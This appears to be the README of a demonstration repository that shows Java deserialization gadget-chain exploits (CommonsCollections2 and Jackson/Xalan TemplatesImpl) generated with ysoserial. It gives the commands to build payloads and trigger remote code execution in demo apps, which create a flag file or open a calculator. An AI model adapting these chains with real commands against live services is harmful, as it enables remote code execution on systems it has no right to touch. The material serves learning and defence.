# ysoserial POC
Some simple demonstrations of deserialization gadget chain exploits created in [ysoserial](https://github.com/frohoff/ysoserial).

Note that I use openjdk version "11.0.2" 2019-01-15 to run ysoserial and the demo application. Much of this will not work in later versions.
```
export JAVA_HOME=~/dev/jdk/jdk-11.0.2
mvn clean install
```


## CommonsCollections2
Generate the payload with ysoserial:
```
java -jar ysoserial-all.jar CommonsCollections2 "touch newfile" > CommonsCollections2.touchfile.payload.bin
```

Demonstrate the exploit with:
```
$JAVA_HOME/bin/java -jar collections40/target/ysoserial-collections40-1.0-SNAPSHOT-all.jar CommonsCollections2.touchfile.payload.bin
```
or
```
$JAVA_HOME/bin/java -jar collections40/target/ysoserial-collections40-1.0-SNAPSHOT-all.jar CommonsCollections2.gnome-calculator.payload.bin
```

Ignore the stacktrace caused by NullPointerException. Verify that `CommonsCollections2_exploited.flag` is created or the Gnome calculator app is opened, demonstrating RCE.


## Jackson / Xalan
Generate the payload with the payload-generator project. The Maven build process creates payload files in `target/payloads`. Add these to Jackson JSON input files. I've included a valid JSON file (JacksonValid.json) and an invalid JSON file (JacksonInvalid.json), and exploit payloads (JacksonExploit_gnome-calculator.json and JacksonExploit_touchfile.json).

These use a packaged xalan library and work for me in JDK 8, 11 and 17. They exploit a vulnerable xalan library so seem not to be JDK dependent.

Demonstrate the exploit with:

```
java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_packaged_xalan_touchfile.json
```
or
```
java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_packaged_xalan_gnome-calculator.json
```

Ignore the stacktrace caused by JsonMappingException. Verify that `TemplatesImpl_exploited.flag` is created or the Gnome calculator app is opened, demonstrating RCE.

Alternatively, the JacksonExploit_bundled_xalan_touchfile.json exploits the xalan library bundled with older (unpatched) JDKs. The following works for me only in JDK 8u40.
```
java -jar jackson/target/ysoserial-jackson-1.0-SNAPSHOT-all.jar JacksonExploit_bundled_xalan_touchfile.json
```